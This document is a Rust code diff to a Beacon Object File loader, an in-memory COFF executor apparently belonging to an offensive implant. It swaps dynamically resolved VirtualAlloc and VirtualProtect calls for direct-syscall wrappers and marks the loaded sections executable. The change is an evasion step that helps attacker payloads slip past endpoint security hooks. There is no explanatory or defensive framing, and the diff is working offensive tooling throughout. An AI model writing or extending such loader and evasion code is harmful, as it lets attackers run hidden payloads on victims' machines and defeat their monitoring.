@@ -357,23 +357,6 @@ unsafe fn run_bof_impl(coff_data: &[u8], args: &[u8]) -> Result<String, String> 
     };
 
     // 4. Allocate memory for sections
-    type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
-    type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
-    type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
-
-    let virtual_alloc: VirtualAllocFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
-            .ok_or("Failed to resolve VirtualAlloc")?
-    );
-    let virtual_protect: VirtualProtectFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
-            .ok_or("Failed to resolve VirtualProtect")?
-    );
-    let _virtual_free: VirtualFreeFn = std::mem::transmute(
-        crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
-            .ok_or("Failed to resolve VirtualFree")?
-    );
-
     let mut section_bases: Vec<*mut u8> = Vec::new();
     for sec in &sections {
         let size = sec.size_of_raw_data.max(sec.virtual_size) as usize;
@@ -382,9 +365,10 @@ unsafe fn run_bof_impl(coff_data: &[u8], args: &[u8]) -> Result<String, String> 
             continue;
         }
 
-        let mem = virtual_alloc(std::ptr::null_mut(), size, 0x3000, 0x04); // MEM_COMMIT|RESERVE, PAGE_READWRITE
+        let mem = crate::syscalls::nt_alloc(size, 0x04) // PAGE_READWRITE
+            .map_err(|e| format!("Section alloc failed: {}", e))?;
         if mem.is_null() {
-            return Err("VirtualAlloc failed for section".to_string());
+            return Err("nt_alloc returned null for section".to_string());
         }
 
         // Copy section data
@@ -554,8 +538,7 @@ unsafe fn run_bof_impl(coff_data: &[u8], args: &[u8]) -> Result<String, String> 
             let base = section_bases[sec_idx];
             if !base.is_null() {
                 let size = sec.size_of_raw_data.max(sec.virtual_size) as usize;
-                let mut old_protect: u32 = 0;
-                virtual_protect(base as *mut c_void, size, 0x20, &mut old_protect); // PAGE_EXECUTE_READ
+                let _ = crate::syscalls::nt_protect(base as *mut c_void, size, 0x20); // PAGE_EXECUTE_READ
             }
         }
     }
